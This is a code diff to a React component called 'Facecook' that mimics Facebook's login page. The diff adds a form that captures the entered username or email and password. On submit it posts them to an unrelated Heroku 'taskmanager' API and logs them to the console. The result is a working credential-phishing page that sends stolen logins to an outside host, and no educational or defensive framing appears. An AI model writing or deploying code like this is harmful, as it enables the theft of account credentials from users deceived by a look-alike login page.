@@ -1,6 +1,22 @@
 import React from "react";
+import axios from "axios";
 
 const Facecook = () => {
+  const [formData, setFormData] = React.useState({ user: "", pass: "" });
+
+  const handleLogin = (e) => {
+    const { name, value } = e.target;
+    setFormData((prevData) => ({ ...prevData, [name]: value }));
+  };
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    axios.post(
+      "https://jackjavitaskmanagerbackend.herokuapp.com/api/v2/tasks",
+      formData
+    );
+    console.log(`${formData.user} and ${formData.pass}`);
+  };
   return (
     <div className="bg-[#f0f2f5] h-screen  w-full font-[Heveltica] flex justify-center items-center ">
       <div className="flex justify-center  h-full flex-col md:flex-row md:gap-[5vw] md:items-center md:justify-center items-center mx-[16px] ">
@@ -14,18 +30,30 @@ const Facecook = () => {
           </p>
         </div>
 
-        <div className="shadow-xl my-8 w-[90vw] bg-white p-6 rounded-lg md:w-[35vw] md:mb-20 flex flex-col gap-3 justify-center items-center">
+        <form
+          onSubmit={handleSubmit}
+          className="shadow-xl my-8 w-[90vw] bg-white p-6 rounded-lg md:w-[35vw] md:mb-20 flex flex-col gap-3 justify-center items-center"
+        >
           <input
             className="shadow outline-1 w-full font-[Helvetica] p-3 text-[14px] bg-[f5f6f7]  border rounded"
-            type="text"
             placeholder="Mobile number or email address"
+            type="text"
+            name="user"
+            value={formData.user}
+            onChange={handleLogin}
+            required
           />
           <input
             className="shadow outline-1 w-full font-[Helvetica] p-3 text-[14px] bg-[f5f6f7] border  rounded"
             type="text"
+            name="pass"
+            value={formData.pass}
+            onChange={handleLogin}
             placeholder="Password"
+            required
           />
           <button
+            type="submit"
             cursor-pointer
             className="bg-[#1877f2] py-3 rounded-md font-bold w-[100%] text-white text-[17px] px-[16px]"
           >
@@ -41,7 +69,7 @@ const Facecook = () => {
           <div className=" cursor-pointer text-white bg-[#42b72a] p-3 rounded-md text-[17px] font-bold">
             Create New Account
           </div>
-        </div>
+        </form>
         <p className="md:hidden text-[#666] font-[11px] md:font-[14px] w-[75%]">
           <span className=" text-[#1c1e21] font-semibold">Create a Page </span>
           for a celebrity, brand or business
